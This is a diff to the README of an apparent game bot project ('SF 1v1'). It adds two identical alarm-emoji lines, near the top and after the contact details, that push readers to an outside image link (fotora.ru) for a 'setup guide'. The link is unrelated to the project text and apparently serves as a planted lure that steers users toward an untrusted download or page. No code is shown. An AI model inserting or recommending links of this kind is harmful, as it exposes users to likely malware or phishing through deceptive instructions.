@@ -14,6 +14,10 @@ I decided to create this project because most of the existing SF 1v1 bots I foun
 
 
 
+🚨🚨!! IMPORTANT!! Check this image for a guide on setting up this bot: https://fotora.ru/uploaded/?ID=ZFYRP31052026165429 🚨🚨
+
+
+
 \---
 
 
@@ -93,3 +97,4 @@ You can reach out via:
 
 \*   👾 \*\*Discord:\*\* DM me at deleted\_user\_1ad51966a18d .
 
+🚨🚨!! IMPORTANT!! Check this image for a guide on setting up this bot: https://fotora.ru/uploaded/?ID=ZFYRP31052026165429 🚨🚨
